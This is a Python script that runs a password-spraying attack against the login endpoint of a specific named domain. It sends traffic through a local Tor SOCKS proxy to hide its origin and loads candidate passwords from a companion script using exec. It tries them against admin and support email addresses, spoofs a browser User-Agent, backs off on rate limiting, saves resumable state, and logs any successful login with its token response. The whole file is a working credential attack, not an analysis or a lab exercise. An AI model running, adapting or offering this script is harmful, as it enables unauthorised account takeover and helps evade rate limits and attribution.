import socket, ssl, json, time, os

HOST = "cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
SOCKS = ("127.0.0.1", 9052)

# build candidates exactly like tor_spray.py
exec(open("tor_spray.py", encoding="utf-8").read().split("cands = build_candidates()")[0])
cands = build_candidates()
prio_emails = ["onlyfake@tuta.io", "admin@onlyfakeai.ru",
               "support@onlyfakeai.ru", "onlyfake@onlyfakeai.ru"]
rows = [f"{em}:{pw}" for pw in cands for em in prio_emails]

state_file = "seq_state.json"
if os.path.exists(state_file):
    state = json.load(open(state_file))
else:
    state = {"i": 0, "hits": [], "throttles": 0}

log = open("seq_spray.log", "a", encoding="utf-8")

def socks_connect():
    s = socket.create_connection(SOCKS, timeout=25)
    s.sendall(b"\x05\x01\x00")
    if s.recv(2) != b"\x05\x00":
        raise RuntimeError("socks auth")
    req = b"\x05\x01\x00\x03" + bytes([len(HOST)]) + HOST.encode() + (443).to_bytes(2, "big")
    s.sendall(req)
    r = s.recv(4)
    if len(r) < 4 or r[1] != 0:
        raise RuntimeError("socks connect")
    atyp = r[3]
    if atyp == 1:
        s.recv(6)
    elif atyp == 3:
        ln = s.recv(1)[0]
        s.recv(ln + 2)
    elif atyp == 4:
        s.recv(18)
    return s

ss = None
reqs_on_conn = 0

def do_req(email, pw):
    global ss, reqs_on_conn
    body = json.dumps({"email": email, "password": pw}).encode()
    for attempt in range(3):
        try:
            if ss is None or reqs_on_conn >= 25:
                if ss:
                    try:
                        ss.close()
                    except Exception:
                        pass
                s = socks_connect()
                ctx = ssl.create_default_context()
                ss = ctx.wrap_socket(s, server_hostname=HOST)
                reqs_on_conn = 0
            raw = (f"POST /auth/v1/token?grant_type=password HTTP/1.1\r\nHost: {HOST}\r\n"
                   "Content-Type: application/json\r\n"
                   f"apikey: {KEY}\r\nAccept: application/json\r\n"
                   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36\r\n"
                   f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n").encode() + body
            ss.sendall(raw)
            head = b""
            while b"\r\n\r\n" not in head:
                chunk = ss.recv(4096)
                if not chunk:
                    raise ConnectionError("closed")
                head += chunk
            h, _, rest = head.partition(b"\r\n\r\n")
            status = int(h.split(b"\r\n", 1)[0].split()[1])
            clen = 0
            for line in h.split(b"\r\n")[1:]:
                if line.lower().startswith(b"content-length:"):
                    clen = int(line.split(b":")[1].strip())
            data = rest
            while len(data) < clen:
                chunk = ss.recv(8192)
                if not chunk:
                    raise ConnectionError("closed body")
                data += chunk
            reqs_on_conn += 1
            return status, data.decode("utf-8", "ignore")
        except Exception:
            try:
                if ss:
                    ss.close()
            except Exception:
                pass
            ss = None
            reqs_on_conn = 0
            time.sleep(1)
    return 0, ""

print(f"[seq] {len(rows)} rows, resume at {state['i']}", flush=True)
while state["i"] < len(rows):
    email, _, pw = rows[state["i"]].partition(":")
    st, body = do_req(email, pw)
    if st == 200:
        state["hits"].append({"email": email, "password": pw, "resp": body[:400]})
        json.dump(state, open(state_file, "w"))
        log.write(f"{time.strftime('%H:%M:%S')} HIT {email}:{pw}\n")
        log.flush()
        print(f"\n!!! HIT {email} : {pw}\n{body[:500]}", flush=True)
        break
    if st == 429:
        state["throttles"] += 1
        time.sleep(12)
        continue
    state["i"] += 1
    if state["i"] % 25 == 0:
        json.dump(state, open(state_file, "w"))
        log.write(f"{time.strftime('%H:%M:%S')} {state['i']}/{len(rows)} throttles={state['throttles']}\n")
        log.flush()
    time.sleep(1.2)
json.dump(state, open(state_file, "w"))
print("[done]", state["i"], state["hits"], flush=True)
